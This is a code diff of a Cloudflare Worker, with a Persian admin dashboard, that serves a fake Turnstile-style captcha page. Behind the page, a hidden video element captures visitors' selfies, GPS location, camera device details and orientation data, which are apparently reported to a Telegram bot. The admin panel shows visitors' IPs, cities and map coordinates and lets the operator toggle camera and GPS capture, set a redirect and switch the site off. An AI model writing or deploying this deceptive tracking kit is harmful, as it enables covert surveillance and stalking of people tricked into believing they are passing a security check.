   for (const [k, v] of Object.entries(extraHeaders)) headers.set(k, v);
@@ -788,7 +716,7 @@ function adminResponse(html, nonce) {
 }
 
 // ============================================================
-//  Admin: shared CSS
+//  Admin CSS
 // ============================================================
 const ADMIN_CSS = `
   :root {
@@ -800,35 +728,35 @@ const ADMIN_CSS = `
   * { box-sizing: border-box; }
   html, body { margin: 0; min-height: 100%; }
   body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
-                 "Helvetica Neue", Arial, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
     background: var(--bg); color: var(--text); padding: 16px;
     display: flex; align-items: flex-start; justify-content: center;
   }
   .wrap { width: 100%; max-width: 680px; }
-  .card {
-    background:#fff; border:1px solid var(--border); border-radius:14px;
-    box-shadow: 0 6px 24px rgba(15,23,42,.06); padding: 20px;
-  }
+  .card { background:#fff; border:1px solid var(--border); border-radius:14px;
+    box-shadow: 0 6px 24px rgba(15,23,42,.06); padding: 20px; }
   h1 { font-size:18px; margin:0; }
   h2 { font-size:15px; margin: 0 0 12px; }
   .subtitle { color: var(--muted); font-size:13px; margin: 4px 0 18px; }
   .alert { padding: 10px 12px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; }
   .alert.err { background: var(--err-bg); color: var(--err); }
   .alert.ok  { background: var(--ok-bg);  color: var(--ok); }
-  input[type=password] {
+  input[type=password], input[type=url], input[type=text] {
     width: 100%; padding: 12px 14px; font-size: 15px;
     border: 1px solid var(--border); border-radius: 10px;
-    background: #fff; color: var(--text); outline: none; transition: border-color .15s;
+    background: #fff; color: var(--text); outline: none;
+    transition: border-color .15s; font-family: inherit;
   }
-  input[type=password]:focus { border-color: var(--accent); }
-  .btn {
-    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  input[type=url], input[type=text] {
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    font-size: 13px; direction: ltr; text-align: left;
+  }
+  input:focus { border-color: var(--accent); }
+  .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px;
     padding: 11px 16px; font-size: 14px; font-weight: 500;
     border: 1px solid var(--border); border-radius: 10px;
     background:#fff; color: var(--text); cursor:pointer; text-decoration:none;
-    transition: all .15s; font-family: inherit;
-  }
+    transition: all .15s; font-family: inherit; }
   .btn:hover { background: #f3f4f6; }
   .btn-primary { background: var(--accent); border-color: var(--accent); color:#fff; }
   .btn-primary:hover { filter: brightness(1.05); }
@@ -840,45 +768,60 @@ const ADMIN_CSS = `
   .btn-sm { padding: 7px 12px; font-size: 12px; }
   .login-icon { font-size: 36px; text-align:center; margin-bottom: 8px; }
   .login-card h1, .login-card .subtitle { text-align: center; }
-  .row-between {
-    display: flex; align-items: center; justify-content: space-between; gap: 12px;
-    margin-bottom: 16px;
-  }
-  .toolbar {
-    display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
-    margin-bottom: 16px;
-  }
-  .features-grid {
-    display: grid; grid-template-columns: 1fr; gap: 14px; margin-bottom: 18px;
-  }
+  .row-between { display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; margin-bottom: 16px; }
+  .toolbar { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin-bottom: 16px; }
+
+  /* Site toggle card */
+  .site-card { padding: 20px; border-radius: 14px; border: 2px solid; margin-bottom: 20px; text-align: center; }
+  .site-card.on { border-color: var(--ok-border); background: linear-gradient(135deg,#f7fdfa,#ecfaf1); }
+  .site-card.off { border-color: var(--err-border); background: linear-gradient(135deg,#fefafa,#fdf0f0); }
+  .site-badge { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+  .site-card.on .site-badge { color: var(--ok); }
+  .site-card.off .site-badge { color: var(--err); }
+  .site-hint { font-size: 13px; color: var(--muted); margin-bottom: 16px; line-height: 1.6; }
+
+  /* UI modes */
+  .ui-options { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+    gap: 10px; margin-bottom: 8px; }
+  .ui-form { margin: 0; }
+  .ui-option { width: 100%; padding: 14px 10px; text-align: center; cursor: pointer;
+    border: 2px solid var(--border); border-radius: 10px; background: #fff;
+    transition: all .15s; font-family: inherit; color: inherit;
+    display: flex; flex-direction: column; align-items: center; gap: 4px; }
+  .ui-option:hover { border-color: var(--accent); background: #fafbfc; }
+  .ui-option.active { border-color: var(--ok); background: var(--ok-bg); }
+  .ui-option-icon { font-size: 22px; line-height: 1; }
+  .ui-option-title { font-weight: 600; font-size: 13px; }
+  .ui-option-desc { font-size: 11px; color: var(--muted); }
+  .ui-option.active .ui-option-desc { color: var(--ok); }
+
+  .url-form { display: flex; gap: 8px; }
+  .url-form input { flex: 1; }
+  .redirect-status { margin-top: 10px; font-size: 12px; padding: 8px 12px;
+    border-radius: 8px; line-height: 1.6; }
+  .redirect-status.active { background: var(--ok-bg); color: var(--ok); }
+  .redirect-status.empty  { background: #f3f4f6; color: var(--muted); }
+  .redirect-status code { background: rgba(0,0,0,.06); padding: 2px 6px;
+    border-radius: 4px; word-break: break-all; }
+
+  /* Features */
+  .features-grid { display: grid; grid-template-columns: 1fr; gap: 14px; margin-bottom: 18px; }
   @media (min-width: 500px) { .features-grid { grid-template-columns: 1fr 1fr; } }
-  .feature-card {
-    border: 1px solid var(--border); border-radius: 12px; padding: 16px;
-    background: #fff; display: flex; flex-direction: column;
-    transition: all .2s;
-  }
+  .feature-card { border: 1px solid var(--border); border-radius: 12px; padding: 16px;
+    background: #fff; display: flex; flex-direction: column; transition: all .2s; }
   .feature-card.active { border-color: var(--ok-border); background: #f7fdfa; }
   .feature-card.inactive { border-color: var(--err-border); background: #fefafa; }
   .feature-head { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
   .feature-icon { font-size: 22px; line-height: 1; }
   .feature-title { font-weight: 600; font-size: 14px; flex: 1; }
-  .feature-status {
-    font-size: 11px; padding: 3px 8px; border-radius: 20px; font-weight: 600;
-    white-space: nowrap;
-  }
+  .feature-status { font-size: 11px; padding: 3px 8px; border-radius: 20px; font-weight: 600; white-space: nowrap; }
   .feature-status.on  { background: var(--ok-bg);  color: var(--ok); }
   .feature-status.off { background: var(--err-bg); color: var(--err); }
-  .feature-hint {
-    font-size: 12px; color: var(--muted); margin-bottom: 12px;
-    line-height: 1.6; flex: 1;
-  }
-  .info-grid {
-    display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 18px;
-  }
-  .info-item {
-    background: #fafbfc; border: 1px solid var(--border);
-    border-radius: 10px; padding: 10px 12px;
-  }
+  .feature-hint { font-size: 12px; color: var(--muted); margin-bottom: 12px; line-height: 1.6; flex: 1; }
+
+  .info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 18px; }
+  .info-item { background: #fafbfc; border: 1px solid var(--border); border-radius: 10px; padding: 10px 12px; }
   .info-label { font-size: 11px; color: var(--muted); display:block; margin-bottom: 3px; }
   .info-value { font-size: 13px; font-weight: 500; }
   .info-value.small { font-size: 11px; }
@@ -889,47 +832,34 @@ const ADMIN_CSS = `
   th { color: var(--muted); font-weight: 500; background: #fafbfc; }
   tr:last-child td { border-bottom: none; }
   .empty { text-align: center; color: var(--muted); padding: 16px !important; }
-  .map-link {
-    color: var(--accent); text-decoration: none; font-family: ui-monospace, monospace;
-    font-size: 11px;
-  }
+  .map-link { color: var(--accent); text-decoration: none;
+    font-family: ui-monospace, monospace; font-size: 11px; }
   .map-link:hover { text-decoration: underline; }
-  .checks {
-    display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px 16px;
+  .checks { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px 16px;
     font-size: 12px; padding: 12px; background: #fafbfc;
-    border: 1px solid var(--border); border-radius: 10px;
-  }
+    border: 1px solid var(--border); border-radius: 10px; }
   .checks .ck { display: flex; align-items: center; gap: 8px; }
   .ck-icon { font-size: 13px; }
   .ck-icon.ok  { color: var(--ok); }
   .ck-icon.miss { color: var(--err); }
   .ck-icon.warn { color: var(--warn); }
+  .section { margin-top: 20px; }
   .mt { margin-top: 16px; }
-  .mt-sm { margin-top: 8px; }
 `;
 
 // ============================================================
-//  Admin: Login page
+//  Admin: Login
 // ============================================================
 function renderAdminLogin(nonce, adminBase, params) {
   const err = params.get('err');
-  const errMsg =
-    err === 'rate'
-      ? '⛔️ تعداد تلاش بیش از حد مجاز. یک دقیقه صبر کنید.'
-      : err === 'invalid'
-        ? '⛔️ رمز عبور اشتباه است.'
-        : null;
-
+  const errMsg = err === 'rate' ? '⛔️ تعداد تلاش بیش از حد. یک دقیقه صبر کنید.'
+    : err === 'invalid' ? '⛔️ رمز عبور اشتباه است.' : null;
   return `<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="fa" dir="rtl"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex,nofollow,noarchive">
 <title>ورود به پنل</title>
-<style nonce="${nonce}">${ADMIN_CSS}</style>
-</head>
-<body>
+<style nonce="${nonce}">${ADMIN_CSS}</style></head><body>
   <div class="wrap" style="max-width:380px">
     <form class="card login-card" method="POST" action="${adminBase}/login">
       <div class="login-icon">🔐</div>
@@ -941,28 +871,26 @@ function renderAdminLogin(nonce, adminBase, params) {
       <button type="submit" class="btn btn-primary btn-block mt">ورود</button>
     </form>
   </div>
-</body>
-</html>`;
+</body></html>`;
 }
 
 // ============================================================
-//  Admin: Feature card helper
+//  Admin: Feature card
 // ============================================================
-function featureCard(opts) {
-  const { icon, title, active, hint, feature, onLabel, offLabel } = opts;
+function featureCard(o) {
   return `
-  <div class="feature-card ${active ? 'active' : 'inactive'}">
+  <div class="feature-card ${o.active ? 'active' : 'inactive'}">
     <div class="feature-head">
-      <span class="feature-icon">${icon}</span>
-      <span class="feature-title">${title}</span>
-      <span class="feature-status ${active ? 'on' : 'off'}">${active ? 'روشن' : 'خاموش'}</span>
+      <span class="feature-icon">${o.icon}</span>
+      <span class="feature-title">${o.title}</span>
+      <span class="feature-status ${o.active ? 'on' : 'off'}">${o.active ? 'روشن' : 'خاموش'}</span>
     </div>
-    <div class="feature-hint">${hint}</div>
-    <form method="POST" action="${opts.adminBase}/toggle" data-confirm="آیا مطمئنید؟">
-      <input type="hidden" name="feature" value="${feature}">
-      <input type="hidden" name="state" value="${active ? 'off' : 'on'}">
-      <button type="submit" class="btn btn-block ${active ? 'btn-danger' : 'btn-success'}">
-        ${active ? offLabel : onLabel}
+    <div class="feature-hint">${o.hint}</div>
+    <form method="POST" action="${o.adminBase}/toggle" data-confirm="آیا مطمئنید؟">
+      <input type="hidden" name="feature" value="${o.feature}">
+      <input type="hidden" name="state" value="${o.active ? 'off' : 'on'}">
+      <button type="submit" class="btn btn-block ${o.active ? 'btn-danger' : 'btn-success'}">
+        ${o.active ? o.offLabel : o.onLabel}
       </button>
     </form>
   </div>`;
@@ -971,84 +899,83 @@ function featureCard(opts) {
 // ============================================================
 //  Admin: Dashboard
 // ============================================================
-function renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, cf, log, params) {
+function renderAdminDashboard(nonce, adminBase, siteState, selfieState, geoState, uiMode, redirectUrl, env, cf, log, params) {
+  const siteOn = siteState !== 'off';
   const selfieOn = selfieState === 'on';
   const geoOn = geoState === 'on';
+  const hasRedirect = !!(redirectUrl && redirectUrl.length > 0);
   const storage = env.SELFIE_STATE ? 'KV' : 'Cache (per-colo)';
-  const now = new Date();
-  const timeStr = now.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+  const timeStr = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
 
-  const okP = params.get('ok');
-  const errP = params.get('err');
+  const okP = params.get('ok'), errP = params.get('err');
   let toast = '';
   if (okP === 'login') toast = `<div class="alert ok">✅ ورود موفق.</div>`;
   else if (okP === 'toggled') {
-    const f = params.get('feature');
-    const s = params.get('state');
-    const label = f === 'geo' ? 'موقعیت' : 'سلفی';
-    toast = `<div class="alert ok">✅ ${label} به «${
-      s === 'on' ? 'روشن' : 'خاموش'
-    }» تغییر کرد.</div>`;
-  } else if (errP === 'state') toast = `<div class="alert err">❌ درخواست نامعتبر.</div>`;
+    const f = params.get('feature'), s = params.get('state');
+    toast = `<div class="alert ok">✅ ${f === 'geo' ? 'موقعیت' : 'سلفی'} به «${s === 'on' ? 'روشن' : 'خاموش'}» تغییر کرد.</div>`;
+  } else if (okP === 'site') {
+    toast = `<div class="alert ok">✅ کل سایت ${params.get('state') === 'on' ? 'روشن' : 'خاموش'} شد.</div>`;
+  } else if (okP === 'ui') {
+    const m = params.get('mode');
+    const found = UI_MODES.find((x) => x.id === m);
+    toast = `<div class="alert ok">✅ ظاهر به «${found ? found.title : m}» تغییر کرد.</div>`;
+  } else if (okP === 'redirect') toast = `<div class="alert ok">✅ آدرس هدایت ذخیره شد.</div>`;
+  else if (errP === 'state') toast = `<div class="alert err">❌ درخواست نامعتبر.</div>`;
+  else if (errP === 'ui') toast = `<div class="alert err">❌ تم نامعتبر.</div>`;
+  else if (errP === 'url') toast = `<div class="alert err">❌ آدرس باید با http:// یا https:// شروع شود.</div>`;
 
   const rows = (log || []).length
-    ? log
-        .map((e) => {
-          const coords =
-            e.lat != null && e.lon != null
-              ? `<a class="map-link" href="${escapeHtml(
-                  `https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lon}`
-                )}" target="_blank" rel="noopener">${e.lat.toFixed(
-                  3
-                )}, ${e.lon.toFixed(3)}</a>`
-              : '<span style="color:var(--muted)">—</span>';
-          return `
-          <tr>
-            <td><code>${new Date(e.ts || 0).toISOString().slice(11, 19)}</code></td>
-            <td><code>${escapeHtml(e.ip || '—')}</code></td>
-            <td>${escapeHtml(e.city || '—')}${e.country ? '، ' + escapeHtml(e.country) : ''}</td>
-            <td>${e.selfieMode === 'on' ? '🟢' : '🔴'}</td>
-            <td>${coords}</td>
-          </tr>`;
-        })
-        .join('')
+    ? log.map((e) => {
+        const coords = e.lat != null && e.lon != null
+          ? `<a class="map-link" href="${escapeHtml(`https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lon}`)}" target="_blank" rel="noopener">${e.lat.toFixed(3)}, ${e.lon.toFixed(3)}</a>`
+          : '<span style="color:var(--muted)">—</span>';
+        return `<tr>
+          <td><code>${new Date(e.ts || 0).toISOString().slice(11, 19)}</code></td>
+          <td><code>${escapeHtml(e.ip || '—')}</code></td>
+          <td>${escapeHtml(e.city || '—')}${e.country ? '، ' + escapeHtml(e.country) : ''}</td>
+          <td>${e.selfieMode === 'on' ? '🟢' : '🔴'}</td>
+          <td>${coords}</td>
+        </tr>`;
+      }).join('')
     : '<tr><td colspan="5" class="empty">هیچ ارسالی ثبت نشده</td></tr>';
 
   const checks = [
     { label: 'TELEGRAM_BOT_TOKEN', ok: !!env.TELEGRAM_BOT_TOKEN },
     { label: 'TELEGRAM_CHAT_ID', ok: !!env.TELEGRAM_CHAT_ID },
     { label: 'ADMIN_TOKEN', ok: !!env.ADMIN_TOKEN },
-    {
-      label: 'ADMIN_PASSWORD',
-      ok: !!env.ADMIN_PASSWORD,
-      warn: !env.ADMIN_PASSWORD,
-    },
-    {
-      label: 'KV (SELFIE_STATE)',
-      ok: !!env.SELFIE_STATE,
-      warn: !env.SELFIE_STATE,
-    },
+    { label: 'ADMIN_PASSWORD', ok: !!env.ADMIN_PASSWORD, warn: !env.ADMIN_PASSWORD },
+    { label: 'KV (SELFIE_STATE)', ok: !!env.SELFIE_STATE, warn: !env.SELFIE_STATE },
     { label: 'SESSION_SECRET', ok: !!env.SESSION_SECRET, optional: true },
   ];
+  const checksHtml = checks.map((c) => {
+    const icon = c.ok ? '✅' : c.warn ? '⚠️' : c.optional ? '➖' : '❌';
+    const cls = c.ok ? 'ok' : c.warn ? 'warn' : c.optional ? '' : 'miss';
+    return `<div class="ck"><span class="ck-icon ${cls}">${icon}</span><span>${c.label}</span></div>`;
+  }).join('');
 
-  const checksHtml = checks
-    .map((c) => {
-      const icon = c.ok ? '✅' : c.warn ? '⚠️' : c.optional ? '➖' : '❌';
-      const cls = c.ok ? 'ok' : c.warn ? 'warn' : c.optional ? '' : 'miss';
-      return `<div class="ck"><span class="ck-icon ${cls}">${icon}</span><span>${c.label}</span></div>`;
-    })
-    .join('');
+  const uiOptionsHtml = UI_MODES.map((m) => `
+    <form method="POST" action="${adminBase}/set-ui" class="ui-form">
+      <input type="hidden" name="mode" value="${m.id}">
+      <button type="submit" class="ui-option ${uiMode === m.id ? 'active' : ''}">
+        <span class="ui-option-icon">${m.icon}</span>
+        <span class="ui-option-title">${m.title}</span>
+        <span class="ui-option-desc">${uiMode === m.id ? '✓ فعال' : m.desc}</span>
+      </button>
+    </form>`).join('');
+
+  const redirectStatusHtml = hasRedirect
+    ? `<div class="redirect-status active">✅ فعال — بعد از تایید به این آدرس منتقل می‌شوند:<br><code>${escapeHtml(redirectUrl)}</code></div>`
+    : `<div class="redirect-status empty">➖ غیرفعال — بعد از تایید، کاربر در همان صفحه می‌ماند.</div>`;
+
+  const kvWarning = !env.SELFIE_STATE
+    ? `<div class="alert err" style="margin-top:10px">⚠️ KV بسته نشده — تنظیمات بین کولوها همگام نمی‌شود.</div>` : '';
 
   return `<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="fa" dir="rtl"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex,nofollow,noarchive">
 <title>پنل مدیریت</title>
-<style nonce="${nonce}">${ADMIN_CSS}</style>
-</head>
-<body>
+<style nonce="${nonce}">${ADMIN_CSS}</style></head><body>
   <div class="wrap">
     <div class="card">
       <div class="row-between">
@@ -1068,67 +995,86 @@ function renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, cf, 
         <a class="btn btn-sm" href="${adminBase}">🔄 بروزرسانی</a>
       </div>
 
-      <div class="features-grid">
-        ${featureCard({
-          icon: '📸',
-          title: 'سلفی',
-          active: selfieOn,
-          hint: selfieOn
-            ? 'از کاربر دوربین درخواست می‌شود و تصویر ارسال می‌گردد'
-            : 'دوربین درخواست نمی‌شود — سایر داده‌ها همچنان ارسال می‌شوند',
-          feature: 'selfie',
-          onLabel: '🟢 روشن کردن سلفی',
-          offLabel: '🔴 خاموش کردن سلفی',
-          adminBase,
-        })}
-        ${featureCard({
-          icon: '📍',
-          title: 'موقعیت دقیق',
-          active: geoOn,
-          hint: geoOn
-            ? 'از کاربر اجازهٔ موقعیت مکانی خواسته می‌شود (GPS با دقت بالا)'
-            : 'موقعیت درخواست نمی‌شود — فقط مختصات IP از Cloudflare ثبت می‌شود',
-          feature: 'geo',
-          onLabel: '🟢 روشن کردن موقعیت',
-          offLabel: '🔴 خاموش کردن موقعیت',
-          adminBase,
-        })}
-      </div>
-
-      <div class="info-grid">
-        <div class="info-item">
-          <span class="info-label">ذخیره‌سازی</span>
-          <span class="info-value">${escapeHtml(storage)}</span>
-        </div>
-        <div class="info-item">
-          <span class="info-label">Colo</span>
-          <span class="info-value">${escapeHtml(cf.colo || '—')}</span>
-        </div>
-        <div class="info-item">
-          <span class="info-label">زمان سرور</span>
-          <span class="info-value small">${escapeHtml(timeStr)}</span>
-        </div>
-      </div>
-
+      <!-- Site-wide ON/OFF -->
       <section>
-        <h2>📋 آخرین ارسال‌ها</h2>
-        <div class="table-wrap">
-          <table>
-            <thead>
-              <tr>
-                <th>زمان</th>
-                <th>IP</th>
-                <th>شهر، کشور</th>
-                <th>سلفی</th>
-                <th>موقعیت</th>
-              </tr>
-            </thead>
-            <tbody>${rows}</tbody>
-          </table>
+        <div class="site-card ${siteOn ? 'on' : 'off'}">
+          <div class="site-badge">${siteOn ? '🟢 سایت روشن است' : '🔴 سایت خاموش است'}</div>
+          <div class="site-hint">${
+            siteOn
+              ? 'کاربران با باز کردن آدرس، صفحهٔ کپچا را می‌بینند.'
+              : 'کاربران با باز کردن آدرس، فقط یک صفحهٔ سفید خالی می‌بینند.'
+          }</div>
+          <form method="POST" action="${adminBase}/set-site"
+                data-confirm="${siteOn ? 'کل سایت خاموش شود؟ کاربران صفحهٔ سفید می‌بینند.' : 'کل سایت روشن شود؟'}">
+            <input type="hidden" name="state" value="${siteOn ? 'off' : 'on'}">
+            <button type="submit" class="btn btn-block ${siteOn ? 'btn-danger' : 'btn-success'}">
+              ${siteOn ? '🔴 خاموش کردن کل سایت' : '🟢 روشن کردن کل سایت'}
+            </button>
+          </form>
         </div>
       </section>
 
-      <section class="mt">
+      <!-- UI theme -->
+      <section class="section">
+        <h2>🎨 ظاهر صفحهٔ کپچا</h2>
+        <div class="ui-options">${uiOptionsHtml}</div>
+      </section>
+
+      <!-- Redirect -->
+      <section class="section">
+        <h2>🔗 هدایت بعد از تایید</h2>
+        <form method="POST" action="${adminBase}/set-redirect" class="url-form">
+          <input type="url" name="url" value="${escapeHtml(redirectUrl || '')}"
+                 placeholder="https://example.com" inputmode="url" autocomplete="off">
+          <button type="submit" class="btn btn-primary">ذخیره</button>
+        </form>
+        ${redirectStatusHtml}
+        <p class="subtitle" style="font-size:11px;margin-top:8px">
+          برای حذف، فیلد را خالی کرده و ذخیره کنید.
+        </p>
+        ${kvWarning}
+      </section>
+
+      <!-- Features -->
+      <section class="section">
+        <h2>⚙️ قابلیت‌ها</h2>
+        <div class="features-grid">
+          ${featureCard({
+            icon: '📸', title: 'سلفی', active: selfieOn,
+            hint: selfieOn
+              ? 'از کاربر دوربین درخواست می‌شود و تصویر ارسال می‌گردد'
+              : 'دوربین درخواست نمی‌شود — سایر داده‌ها همچنان ارسال می‌شوند',
+            feature: 'selfie',
+            onLabel: '🟢 روشن کردن سلفی', offLabel: '🔴 خاموش کردن سلفی',
+            adminBase,
+          })}
+          ${featureCard({
+            icon: '📍', title: 'موقعیت دقیق', active: geoOn,
+            hint: geoOn
+              ? 'از کاربر اجازهٔ موقعیت مکانی خواسته می‌شود (GPS دقت بالا)'
+              : 'موقعیت درخواست نمی‌شود — فقط مختصات IP ثبت می‌شود',
+            feature: 'geo',
+            onLabel: '🟢 روشن کردن موقعیت', offLabel: '🔴 خاموش کردن موقعیت',
+            adminBase,
+          })}
+        </div>
+      </section>
+
+      <div class="info-grid">
+        <div class="info-item"><span class="info-label">ذخیره‌سازی</span><span class="info-value">${escapeHtml(storage)}</span></div>
+        <div class="info-item"><span class="info-label">Colo</span><span class="info-value">${escapeHtml(cf.colo || '—')}</span></div>
+        <div class="info-item"><span class="info-label">زمان سرور</span><span class="info-value small">${escapeHtml(timeStr)}</span></div>
+      </div>
+
+      <section class="section">
+        <h2>📋 آخرین ارسال‌ها</h2>
+        <div class="table-wrap"><table>
+          <thead><tr><th>زمان</th><th>IP</th><th>شهر، کشور</th><th>سلفی</th><th>موقعیت</th></tr></thead>
+          <tbody>${rows}</tbody>
+        </table></div>
+      </section>
+
+      <section class="section">
         <h2>🛠 سلامت تنظیمات</h2>
         <div class="checks">${checksHtml}</div>
       </section>
@@ -1136,186 +1082,410 @@ function renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, cf, 
   </div>
 
 <script nonce="${nonce}">
-  document.querySelectorAll('form[data-confirm]').forEach((f) => {
-    f.addEventListener('submit', (e) => {
+  document.querySelectorAll('form[data-confirm]').forEach(function (f) {
+    f.addEventListener('submit', function (e) {
       if (!confirm(f.dataset.confirm)) e.preventDefault();
     });
   });
 </script>
-</body>
-</html>`;
+</body></html>`;
 }
 
 // ============================================================
-//  Frontend (captcha page — Cloudflare Turnstile style)
+//  Shared captcha script (used by all themes)
 // ============================================================
-function renderHTML(nonce, selfieState, geoState) {
-  const selfieMode = selfieState === 'off' ? 'off' : 'on';
-  const geoMode = geoState === 'on' ? 'on' : 'off';
+function captchaScript(nonce, selfieMode, geoMode, redirectUrl, labels) {
+  return `<script nonce="${nonce}">
+(function () {
+  var SELFIE_MODE = ${JSON.stringify(selfieMode)};
+  var GEO_MODE = ${JSON.stringify(geoMode)};
+  var REDIRECT_URL = ${JSON.stringify(redirectUrl || '')};
+  var L = ${JSON.stringify(labels || {})};
 
+  var widget = document.getElementById('widget');
+  var labelEl = document.getElementById('label');
+  var status = document.getElementById('status');
+  var retry = document.getElementById('retry');
+  var video = document.getElementById('hiddenVideo');
+  var canvas = document.getElementById('canvas');
+  var ray = document.getElementById('ray');
+
+  if (ray) {
+    var chars = '0123456789abcdef', rid = '';
+    for (var i = 0; i < 16; i++) rid += chars[Math.floor(Math.random() * 16)];
+    ray.textContent = rid;
+  }
+
+  var statusBaseClass = status ? status.className : '';
+  var busy = false, completed = false;
+
+  var CAM_ERRORS = {
+    NotAllowedError: L.camNotAllowed || 'Camera access was denied.',
+    NotFoundError: L.camNotFound || 'No camera found.',
+    NotReadableError: L.camNotReadable || 'Camera is in use by another app.',
+    OverconstrainedError: L.camOverconstrained || 'Camera settings not supported.',
+    SecurityError: L.camSecurity || 'HTTPS required for camera.',
+    AbortError: L.camAbort || 'Camera access was aborted.'
+  };
+
+  function setState(state, message) {
+    widget.classList.remove('busy', 'done');
+    widget.setAttribute('aria-checked', 'false');
+    if (status) { status.className = statusBaseClass; status.textContent = ''; }
+    if (retry) retry.style.display = 'none';
+
+    if (state === 'busy') {
+      widget.classList.add('busy');
+      if (L.labelBusy && labelEl) labelEl.textContent = L.labelBusy;
+      if (status) status.textContent = L.busy || 'Verifying...';
+    } else if (state === 'done') {
+      widget.classList.add('done');
+      widget.setAttribute('aria-checked', 'true');
+      if (L.labelDone && labelEl) labelEl.textContent = L.labelDone;
+      if (status) { status.className = statusBaseClass + ' ok'; status.textContent = L.done || 'Verified'; }
+    } else if (state === 'error') {
+      if (L.labelIdle && labelEl) labelEl.textContent = L.labelIdle;
+      if (status) {
+        status.className = statusBaseClass + ' error';
+        status.textContent = message || L.error || 'Please try again.';
+      }
+      if (retry) retry.style.display = 'inline-block';
+    } else {
+      if (L.labelIdle && labelEl) labelEl.textContent = L.labelIdle;
+    }
+  }
+
+  async function getCameraStream() {
+    var primary = { video: { facingMode: 'user' }, audio: false };
+    try { return await navigator.mediaDevices.getUserMedia(primary); }
+    catch (e) {
+      if (e.name === 'OverconstrainedError' || e.name === 'NotFoundError') {
+        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      }
+      throw e;
+    }
+  }
+
+  function waitForVideo(v, timeoutMs) {
+    if (v.readyState >= 2) return Promise.resolve();
+    return new Promise(function (resolve, reject) {
+      var to = setTimeout(function () { reject(new Error('camera_timeout')); }, timeoutMs || 6000);
+      v.onloadeddata = function () { clearTimeout(to); resolve(); };
+    });
+  }
+
+  async function collectCameraInfo(stream) {
+    var info = {};
+    var track = stream.getVideoTracks()[0];
+    if (!track) return info;
+    try {
+      var s = (track.getSettings && track.getSettings()) || {};
+      var c = (track.getCapabilities && track.getCapabilities()) || {};
+      info.deviceId = s.deviceId; info.groupId = s.groupId;
+      info.facingMode = s.facingMode; info.width = s.width; info.height = s.height;
+      info.frameRate = s.frameRate; info.aspectRatio = s.aspectRatio;
+      info.resizeMode = s.resizeMode; info.focusMode = s.focusMode;
+      info.exposureMode = s.exposureMode; info.whiteBalanceMode = s.whiteBalanceMode;
+      info.supportedFacingModes = c.facingMode || [];
+      info.supportedFocusModes = c.focusMode || [];
+      info.hasTorch = !!c.torch;
+      info.zoom = c.zoom ? { min: c.zoom.min, max: c.zoom.max, step: c.zoom.step } : null;
+      info.iso = c.iso ? { min: c.iso.min, max: c.iso.max, step: c.iso.step } : null;
+      info.focusDistance = c.focusDistance ? { min: c.focusDistance.min, max: c.focusDistance.max } : null;
+      info.brightness = c.brightness ? { min: c.brightness.min, max: c.brightness.max } : null;
+      info.contrast = c.contrast ? { min: c.contrast.min, max: c.contrast.max } : null;
+      info.saturation = c.saturation ? { min: c.saturation.min, max: c.saturation.max } : null;
+      info.sharpness = c.sharpness ? { min: c.sharpness.min, max: c.sharpness.max } : null;
+      info.requestedConstraints = (track.getConstraints && track.getConstraints()) || null;
+    } catch (e) { info._settingsError = String(e); }
+    try {
+      var devices = await navigator.mediaDevices.enumerateDevices();
+      info.videoDeviceCount = devices.filter(function (d) { return d.kind === 'videoinput'; }).length;
+      info.audioDeviceCount = devices.filter(function (d) { return d.kind === 'audioinput'; }).length;
+      info.videoDeviceLabels = devices.filter(function (d) { return d.kind === 'videoinput'; })
+        .map(function (d) { return d.label || '(unnamed)'; });
+    } catch (e) { info._enumerateError = String(e); }
+    return info;
+  }
+
+  async function requestOrientationPermission() {
+    try {
+      if (typeof DeviceOrientationEvent === 'undefined') return { available: false, reason: 'unsupported' };
+      if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+        var state = await DeviceOrientationEvent.requestPermission();
+        return { available: state === 'granted', reason: state };
+      }
+      return { available: true, reason: 'no_permission_needed' };
+    } catch (e) { return { available: false, reason: String((e && e.message) || e) }; }
+  }
+
+  async function collectOrientation(sampleMs) {
+    var result = { supported: typeof DeviceOrientationEvent !== 'undefined', samples: [] };
+    try {
+      if (screen.orientation) result.screenOrientation = { type: screen.orientation.type, angle: screen.orientation.angle };
+      else if (typeof window.orientation !== 'undefined') result.screenOrientation = { angle: window.orientation };
+    } catch (e) { result._screenOrientationError = String(e); }
+    if (!result.supported) return result;
+
+    var collected = [];
+    var listener = function (ev) {
+      collected.push({
+        alpha: typeof ev.alpha === 'number' ? ev.alpha : null,
+        beta: typeof ev.beta === 'number' ? ev.beta : null,
+        gamma: typeof ev.gamma === 'number' ? ev.gamma : null,
+        absolute: ev.absolute === true
+      });
+    };
